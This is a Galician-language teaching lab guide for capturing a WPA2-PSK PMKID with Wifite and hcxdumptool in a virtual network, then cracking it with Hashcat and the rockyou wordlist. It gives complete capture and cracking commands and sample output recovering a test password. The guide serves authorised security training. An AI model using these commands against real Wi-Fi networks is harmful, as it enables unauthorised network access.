# Guía da práctica Wifite 1.4 — PMKID en WPA2-PSK


!!! warning "**LIMITACIÓN DE RESPONSABILIDADE**" 
    O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa información exposta no mesmo. Este documento foi xerado para uso didáctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.  
    O uso de Wifite ou calquera outra ferramenta de auditoría en redes Wi-Fi sen autorización expresa é **ILEGAL**.

## 1. Resumo

Esta práctica introduce o ataque **PMKID (Pairwise Master Key Identifier)** como método alternativo para auditar redes WPA2-PSK utilizando **Wifite** como ferramenta automatizada.

!!! info "Resultado comprobado no laboratorio"
    Co escenario `psk`, Wifite conseguiu capturar un PMKID e recuperar o contrasinal con Hashcat. A captura require que o intercambio proporcione un PMKID aproveitable; noutras redes o resultado pode variar. A evidencia distintiva é un rexistro `WPA*01` no formato Hashcat 22000, non `WPA*02` (EAPOL).

---

## 2. Funcionamento de Wifite con PMKID

Wifite automatiza o recoñecemento do AP, o intento de captura PMKID e a comprobación de contrasinais mediante ferramentas auxiliares. No laboratorio comprobouse que **Wifite captura PMKID no escenario `psk` e Hashcat recupera a clave de proba**.

Isto non significa que todos os puntos de acceso proporcionen PMKID. O resultado depende da configuración e do intercambio observado. Cando non aparece un `WPA*01`, cómpre documentar a ausencia, comprobar os avisos de Wifite e distinguir PMKID dun handshake EAPOL `WPA*02`.

| Comprobación | Resultado no laboratorio |
|---|---|
| Detección do AP `EMPRESA-XYZ` | Correcta |
| Captura PMKID con Wifite | Correcta |
| Recuperación da PSK con Hashcat e Rockyou | Correcta, tras habilitar OpenCL con PoCL |
| Captura PMKID noutros AP | Non garantida |

!!! warning "Procesos necesarios para o escenario"
    Se Wifite informa de procesos en conflito (`hostapd`, `wpa_supplicant`), non empregues `--kill`: manteñen activos o AP e o cliente do laboratorio.

### OpenCL para Hashcat na VM

A instalación de Hashcat, por si soa, non garante que exista un dispositivo de cálculo. Para executar Hashcat sobre a CPU virtualizada, se aínda non está configurado:

```bash
sudo apt update
sudo apt install -y pocl-opencl-icd clinfo
clinfo -l
hashcat -I
```

Se aparece `CL_PLATFORM_NOT_FOUND_KHR`, Hashcat non detecta unha plataforma OpenCL. Iso é distinto dun contrasinal incorrecto.

### Execución limpa e evidencias independentes

Para non reutilizar capturas ou resultados doutras prácticas, crea un directorio de traballo exclusivo **antes de iniciar Wifite**:

```bash
sudo install -d -m 700 /root/wifite-pmkid
sudo -i
cd /root/wifite-pmkid
pwd
ls -la
```

Se xa executaches Wifite nese directorio, **conserva as evidencias antes de limpar**. Para repetir desde cero, sempre desde `/root` e despois de confirmar a ruta:

```bash
cd /root
mv wifite-pmkid "wifite-pmkid-arquivo-$(date +%Y%m%d-%H%M%S)"
install -d -m 700 /root/wifite-pmkid
cd /root/wifite-pmkid
```

Wifite pode xerar `hs/`, `cracked.json`, `cracked.txt` ou rexistros no directorio de traballo. O *potfile* global de Hashcat é independente: non o borres porque pode conter traballos alleos. Para unha comprobación manual reproducible, usa `hashcat --potfile-disable`.

Para identificar unha captura PMKID auténtica, converte a captura nova con `hcxpcapngtool` e comproba que contén **`WPA*01`**. Unha liña `WPA*02` identifica unha parella EAPOL, non un PMKID.

---

## 3. Obxectivos de aprendizaxe

- Identificar o AP WPA2-PSK e comprobar o seu BSSID e a canle.
- Automatizar con Wifite a captura dun PMKID no escenario de laboratorio `psk`.
- Distinguir as evidencias `WPA*01` (PMKID) e `WPA*02` (EAPOL).
- Validar con Hashcat e Rockyou a robustez da clave compartida de proba.
- Evitar a reutilización de capturas e resultados de execucións anteriores.
- Comprender que non todos os AP proporcionan un PMKID capturable.

**Vantaxes potenciais do PMKID respecto dunha captura por desautenticación:** non require capturar as catro mensaxes do 4-way handshake nin desautenticar un cliente lexítimo; non obstante, a súa dispoñibilidade non está garantida e a técnica deixa tráfico observable.

---

## 4. Material necesario

**Hardware/Software:**  
- Host alumnado · Máquina virtual GNU/Linux Kali amd64  
- RAM ≥ 2048 MB · CPU ≥ 2 cores · PAE/NX habilitado

**Ferramentas** (xa instaladas en Kali):  
`wifite`, `hcxdumptool` (≥ 7.0.0), `hcxpcapngtool` (parte de hcxtools), `hashcat`, `hostapd`, `wpa_supplicant`, `mac80211_hwsim`

**Wordlist:** `/usr/share/wordlists/rockyou.txt.gz`

**Referencias:**
- [0] [1-Taller-HE-Practica-WiFi-4.pdf](https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-4.pdf){:target="_blank"}  
- [1] [Wifite2 GitHub](https://github.com/derv82/wifite2){:target="_blank"}  
- [2] Descubridor PMKID: Jens "atom" Steube (Agosto 2018)  
- [3] [Hashcat Forum — PMKID Attack](https://hashcat.net/forum/thread-7717.html){:target="_blank"}

---

## 5. Escenario e topoloxía

| Rol               | Interface | Namespace             | IP               | Estado tras `wifilabctl up` |
|-------------------|-----------|-----------------------|------------------|-----------------------------|
| AP WPA2-PSK       | `wlan0`   | `wifi_ap_wlan0`       | `192.168.10.1`   | ✅ Automático                |
| Cliente WPA2      | `wlan1`   | `wifi_cliente_wlan1`  | `192.168.10.2`   | ✅ Automático                |
| Atacante (Wifite) | `wlan2`   | (global)              | —                | Interface dispoñible           |
| Monitor adicional | `wlan3`   | (global)              | —                | Interface dispoñible           |

**SSID:** `EMPRESA-XYZ` · **Contrasinal:** `spongebob19` · **Canal:** 6

```
[wlan1: Cliente PSK]  ----wireless----> [wlan0: AP WPA2-PSK]
                                              ^
                                              |
                                    [wlan2mon: Wifite / hcxdumptool]
                                    (captura PMKID con Wifite)
```

> 💡 `wifilabctl up psk` levanta automaticamente AP e cliente. As terminais utilízanse para captura, comprobación e análise, non para configuración manual.

---

## 6. Procedemento

**Resumo de terminais:**

Emprega as seguintes terminais desde a sesión gráfica de Kali; o traballo con Wifite realizarase nun directorio propio para non mesturar resultados.


| Terminal | Rol                                                        |
|----------|------------------------------------------------------------|
| 1        | Arrancar o escenario e verificacións                       |
| 2        | Captura PMKID con Wifite                  |
| 3        | Verificación manual con `hcxdumptool` (opcional) |

---

### Terminal 1 — Arrancar o escenario

```bash
# Mesmo escenario que a Práctica 1-1
sudo wifilabctl up psk
```

Saída esperada:
```
[*] Informe de Estado do Laboratorio
============================================================
NAMESPACE                 INTERFACE       IP                   ESTADO
---------------------------------------------------------------------------
wifi_cliente_wlan1        wlan1           192.168.10.2/24      UP
wifi_ap_wlan0             wlan0           192.168.10.1/24      UP
---------------------------------------------------------------------------
Interfaces GLOBAIS / ATACANTE:
(global)                  wlan2           (host/monitor)       LISTO
(global)                  wlan3           (host/monitor)       LISTO
```

> ⚠️ O escenario `psk` é o mesmo da [Práctica 1.1](1.1-ATAQUE_WPA2_PSK.md){:target="_blank"}. Os valores de BSSID e MAC do cliente obtéñense con `sudo wifilabctl status`.

---

### Terminal 2 — Captura PMKID con Wifite

Abrir unha **segunda terminal** e seguir os pasos:

#### Paso 1: Acceder como root e verificar ferramentas

```bash
sudo -i
cd /root/wifite-pmkid

# Verificar que hcxdumptool está instalado (requirido por Wifite para PMKID)
which hcxdumptool && hcxdumptool --version
which hcxpcapngtool

# Se non están instalados:
apt update && apt -y install hcxdumptool hcxtools

# Descomprimir wordlist
gunzip -kf /usr/share/wordlists/rockyou.txt.gz
```

#### Paso 2: Lanzar Wifite con ataque PMKID

```bash
wifite -i wlan2 --pmkid --dict /usr/share/wordlists/rockyou.txt
```

> `-i wlan2`: interface a usar · `--pmkid`: priorizar PMKID sobre handshake · `--dict`: wordlist para cracking

#### Paso 3: Avisos de procesos en conflito — non matar

```
 [!] Conflicting processes: NetworkManager (PID 642), wpa_supplicant (PID 1919),
     hostapd (PID 2009), wpa_supplicant (PID 2024)
 [!] If you have problems: kill -9 PID or re-run wifite with --kill
```

> ⚠️ **Non matar eses procesos.** Son o AP e o cliente do escenario. Ignorar e continuar.

#### Paso 4: Seleccionar a interface de ataque

Con `mac80211_hwsim`, Wifite pide seleccionar entre `wlan2` e `wlan3`:

```
    Interface   PHY   Driver              Chipset
-----------------------------------------------------------------------
 1. wlan2       phy2  ??????              non-mac80211 device? (report this!)
 2. wlan3       phy3  ??????              non-mac80211 device? (report this!)
 [+] Select wireless interface (1-2): 1
```

Introducir `1` e premer Enter.

> 💡 O aviso `non-mac80211 device?` é normal con interfaces virtuais. Non impide o funcionamento.

#### Paso 5: Escaneo e selección do AP obxectivo

Wifite escaneará en modo monitor. Cando apareza `EMPRESA-XYZ` premer `Ctrl+C`:

```
   NUM                      ESSID   CH  ENCR    PWR    WPS  CLIENT
   ---  -------------------------  ---  -----   ----   ---  ------
     1               EMPRESA-XYZ     6  WPA-P   72db    no     1
```

```
 [+] Select target(s) (1-1) separated by commas, dashes or all: 1
```

Introducir `1` e premer Enter.

#### Paso 6: Captura PMKID e recuperación da clave

Wifite iniciará o intento de captura PMKID e, se atopa material válido, poderá invocar Hashcat coa lista Rockyou. No laboratorio comprobouse a captura do PMKID e a recuperación de `spongebob19`.

**Exemplo de saída real dunha execución correcta no laboratorio:**

```text
 NUM                    ESSID   CH  ENCR    PWR  WPS  CLIENT
 ---  -----------------------  ---  -----  ----  ---  ------
   1              EMPRESA-XYZ    6  WPA2-P  72db   no       1

[+] Select target(s) (1-1) separated by commas, dashes or all: 1
[+] (1/1) Starting attacks against 46:02:77:21:58:3C (EMPRESA-XYZ)
[+] EMPRESA-XYZ (72db) PMKID CAPTURE: Captured PMKID
[+] EMPRESA-XYZ (72db) PMKID CRACK: Cracking PMKID using /usr/share/wordlists/rockyou.txt ...
[+] EMPRESA-XYZ (72db) PMKID CRACKED: Key: spongebob19

[+]  Access Point Name: EMPRESA-XYZ
[+]  Access Point BSSID: 46:02:77:21:58:3C
[+]  Encryption: PMKID
[+]  PMKID File: hs/pmkid_EMPRESAXYZ_46-02-77-21-58-3C_2026-11-16T11-16-48.22000
[+]  PSK (password): spongebob19
[+] saved result to cracked.json (1 total)
[+] Finished attacking 1 target(s), exiting
```

Nesta saída obsérvanse **tres fitos diferentes**:

1. **`PMKID CAPTURE: Captured PMKID`**: Wifite obtivo material PMKID do AP seleccionado.
2. **`PMKID CRACK: Cracking PMKID ...`**: iniciouse a comprobación dos contrasinais do dicionario Rockyou.
3. **`PMKID CRACKED: Key: spongebob19`**: o candidato correspondente á clave de proba foi verificado satisfactoriamente.

O ficheiro `hs/pmkid_...22000` conserva o material da captura e `cracked.json` rexistra o resultado. O **BSSID e o nome do ficheiro cambian en cada execución**: os valores anteriores son os da captura utilizada como exemplo. A mensaxe `PMKID CRACKED` acredita a recuperación do contrasinal neste intento, e é distinta dunha captura que só obtivese PMKID sen recuperar a clave.


Non confundas os resultados:

- **PMKID capturado:** Wifite indica éxito na captura; verifica no artefacto convertido a `22000` que exista `WPA*01`.
- **Clave recuperada:** Hashcat consegue verificar un candidato da lista de dicionario.
- **`key unknown`:** non demostra por si só que o contrasinal non estea na lista; comproba `hashcat -I` e a dispoñibilidade de OpenCL.
- **Tempo de espera esgotado:** nese intento non se obtivo un PMKID; anota a evidencia e non afirmes que a ferramenta nunca funciona.

Comproba os novos ficheiros producidos dentro de `/root/wifite-pmkid` e conserva a saída da ferramenta como evidencia da práctica.

---

### Terminal 1 — Verificacións tras a captura

```bash
# Confirmar que o cliente permanece conectado (o ataque PMKID non o perturbou)
sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
# Connected to <BSSID_AP> (on wlan1)
# SSID: EMPRESA-XYZ

# Examinar exclusivamente os resultados desta práctica
sudo find /root/wifite-pmkid -maxdepth 2 -type f -printf "%p\n"
```

---

### Terminal 3 — Método manual con hcxdumptool que SÍ funciona (opcional)

Se se quere comparar unha captura manual coa automatizada, utiliza `hcxdumptool` nunha **terceira terminal**, de maneira opcional. Non é necesario para validar o éxito de Wifite:

```bash
sudo su -

# Poñer wlan3 en modo monitor
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up

# Obter o BSSID do AP (columna INTERFACE wlan0 en wifilabctl status)
# e convertelo a formato sen dous puntos: ex. 02:00:00:00:00:00 → 020000000000
sudo wifilabctl status

# Capturar PMKID directamente con hcxdumptool
hcxdumptool -i wlan3 -w /tmp/pmkid-manual.pcapng \
  --filtermode=2 --filterlist_ap=<BSSID_SEN_DOUS_PUNTOS> \
  -c 6 --rds=1
# Premer Ctrl+C despois de 30 segundos

# Converter a formato hashcat
hcxpcapngtool -o /tmp/pmkid-manual.hc22000 /tmp/pmkid-manual.pcapng

# Verificar que o PMKID foi capturado (debe mostrar datos)
cat /tmp/pmkid-manual.hc22000

# Crackear con hashcat
hashcat -m 22000 /tmp/pmkid-manual.hc22000 /usr/share/wordlists/rockyou.txt
# KEY FOUND! [ spongebob19 ]
```

> 💡 O procedemento manual complementario está documentado en [1.3-ATAQUE_WPA2_PSK_PMKID](1.4-ATAQUE_WPA2_PSK_PMKID.md){:target="_blank"}.

---

## 7. Comparativa PMKID vs handshake tradicional

| Característica | Handshake EAPOL | PMKID |
|---|---|---|
| Evidencia no formato 22000 | `WPA*02` | `WPA*01` |
| Necesidade de desautenticación | Non sempre: pode capturarse nunha asociación normal | Non é necesaria para obter un PMKID exposto |
| Material requerido | Parella de mensaxes EAPOL válida | PMKID verificable |
| Dispoñibilidade | Depende de observar unha autenticación | Depende de que o intercambio proporcione PMKID |
| Uso de Wifite neste laboratorio | Comprobado | Comprobado |
| Comprobación de contrasinais | Hashcat (modo 22000) | Hashcat (modo 22000) |

A captura PMKID pode evitar a desautenticación dun cliente xa conectado, pero **non equivale a unha técnica invisible ou universal**. A robustez do contrasinal segue sendo determinante para resistir as probas de dicionario.

---

## 8. Preguntas de reflexión

1. **Que diferenza hai entre `WPA*01` e `WPA*02`?**

    - `WPA*01` representa material PMKID; `WPA*02` representa material EAPOL. Ambos se empregan no modo 22000, pero non son a mesma técnica.

2. **É imprescindible desconectar o cliente para obter un PMKID?**

    - Non. Un PMKID aproveitable pode aparecer en determinados intercambios sen desautenticación, aínda que non está garantido.

3. **Por que `key unknown` non proba que a clave sexa robusta?**

    - Pode existir un erro de OpenCL ou do motor de cálculo. Hai que diferenciar os erros de execución dun dicionario esgotado.

4. **Que significa que Wifite capture PMKID no laboratorio `psk`?**

    - Que esa configuración e ese intercambio xeraron material aproveitable na proba. Non implica que suceda en todas as redes WPA2-PSK.

5. **Que vantaxe ten gardar as evidencias nun directorio exclusivo?**

    - Permite demostrar que o material e o resultado corresponden á execución actual, sen reutilizar capturas anteriores.

6. **Como reducir o risco de probas de dicionario?**

    - Utilizar contrasinais fortes e únicos e, cando sexa viable, WPA3-SAE coas actualizacións e configuracións de seguridade adecuadas.

7. **En que contornas é lexítima esta práctica?**

    - En laboratorios propios ou redes cunha autorización expresa e dentro do alcance acordado.

---

## 9. Limpeza do laboratorio

**Terminal 1:**

```bash
# Deter e eliminar o escenario completamente
sudo wifilabctl reset

# Verificar que non quedan namespaces
ip netns list
```

**Terminal 3** (se se usou `wlan3` en modo monitor):

```bash
ip link set wlan3 down
iw dev wlan3 set type managed
ip link set wlan3 up
```
